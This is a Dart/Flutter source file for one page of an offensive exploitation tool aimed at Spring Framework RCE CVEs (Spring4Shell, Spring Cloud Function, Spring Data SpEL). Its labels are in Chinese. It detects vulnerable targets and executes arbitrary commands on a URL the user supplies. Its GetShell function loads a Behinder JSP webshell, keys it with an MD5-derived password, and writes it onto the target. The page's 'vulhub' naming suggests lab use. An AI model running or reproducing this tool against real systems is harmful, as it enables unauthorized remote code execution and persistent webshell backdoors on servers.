import 'dart:convert';

import 'package:crypto/crypto.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show rootBundle;

import '../../app/constants.dart';
import '../../exp/vulhub/spring_exp_service.dart';
import '../../theme/app_theme.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';

class SpringExpPage extends BaseVulhubExpPage {
  const SpringExpPage({super.key});
  @override
  State<SpringExpPage> createState() => _SpringPageState();
}

class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
  @override
  IconData get pageIcon => Icons.local_florist;
  @override
  String get appBarTitle =>
      'Spring Framework RCE (CVE-2022-22963/22965/2018-1273/2017-8046/2016-4977)';
  @override
  String get cardTitle => 'Spring Framework RCE';
  @override
  String get cardSubtitle => 'Spring4Shell / Spring Cloud Function / Spring Data SpEL 注入系列';

  final _urlCtrl = TextEditingController();
  final _cmdCtrl = TextEditingController(text: 'id');
  final _timeoutCtrl = TextEditingController();
  final _passwordCtrl = TextEditingController(text: AppConstants.defaultShellPassword);

  SpringVulnType _selected = SpringVulnType.springCloudFunction;

  SpringExpService _svc() => SpringExpService(
        url: _urlCtrl.text.trim(),
        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
      );

  Future<void> _check() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
    setState(() => running = true);
    appendLog('[*] 检测 ${_selected.label}...');
    try {
      final r = await _svc().checkSingle(_selected);
      appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到 ${r.vulnName}');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _checkAll() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
    setState(() => running = true);
    appendLog('[*] 批量检测所有 Spring CVE...');
    try {
      final svc = _svc();
      SpringVulnType? firstHit;
      for (final t in SpringVulnType.values) {
        appendLog('[*] 检测 ${t.label}...');
        final r = await svc.checkSingle(t);
        appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] ${r.vulnName}');
        if (r.vulnerable && firstHit == null) {
          firstHit = t;
        }
      }
      if (firstHit != null && mounted) {
        setState(() => _selected = firstHit!);
        appendLog('[*] 已自动选择首个命中漏洞: ${firstHit.label}');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _execRce() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => running = true);
    appendLog('[*] 执行命令 (${_selected.label}): $cmd');
    try {
      final out = await _svc().execRce(_selected, cmd);
      if (out != null && out.isNotEmpty) {
        appendLog('[+] 输出:\n$out');
      } else {
        appendLog('[-] 无输出（该漏洞可能无直接回显）');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _getShell() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { appendLog('[!] 请输入目标 URL'); return; }
    setState(() => running = true);
    appendLog('[*] GetShell (${_selected.label})...');
    try {
      final password = _passwordCtrl.text.trim().isEmpty
          ? AppConstants.defaultShellPassword
          : _passwordCtrl.text.trim();
      var shellContent = await rootBundle.loadString('assets/defaults/payloads/jsp_behinder.jsp');
      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
      shellContent = shellContent.replaceFirst(
        RegExp(r'String k="[0-9a-f]{16}"'),
        'String k="$key"',
      );
      final shellUrl = await _svc().getShell(
        _selected,
        shellContent,
        onLog: appendLog,
      );
      if (shellUrl != null) {
        appendLog('[+] GetShell 成功: $shellUrl');
      } else {
        appendLog('[-] GetShell 失败：未发现可访问的 shell 文件');
      }
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _cmdCtrl.dispose();
    _timeoutCtrl.dispose();
    _passwordCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        vSecTitle('目标配置'),
        vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
        const SizedBox(height: 8),
        vTf(
          _timeoutCtrl,
          '超时(s)',
          '${AppConstants.defaultHttpTimeoutSeconds}',
          type: TextInputType.number,
        ),
        const SizedBox(height: 16),
        vSecTitle('漏洞选择'),
        DropdownButtonFormField<SpringVulnType>(
          initialValue: _selected,
          isExpanded: true,
          dropdownColor: AppColors.bgElevated,
          style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
          items: SpringVulnType.values
              .map((t) => DropdownMenuItem(value: t, child: Text(t.label, overflow: TextOverflow.ellipsis)))
              .toList(),
          onChanged: running ? null : (t) => t != null ? setState(() => _selected = t) : null,
          decoration: vInputDec('CVE', ''),
        ),
        const SizedBox(height: 8),
        Row(children: [
          vBtn('检测', running ? null : _check),
          const SizedBox(width: 8),
          vBtn('检测全部', running ? null : _checkAll),
        ]),
        const SizedBox(height: 16),
        vSecTitle('命令执行'),
        vTf(_cmdCtrl, '命令', 'id'),
        const SizedBox(height: 8),
        vBtn('执行命令', running ? null : _execRce),
        const SizedBox(height: 16),
        vSecTitle('GetShell'),
        vTf(_passwordCtrl, '冰蝎密码', AppConstants.defaultShellPassword),
        const SizedBox(height: 8),
        vBtn('GetShell (写入 JSP)', running ? null : _getShell),
      ]),
    );
  }
}
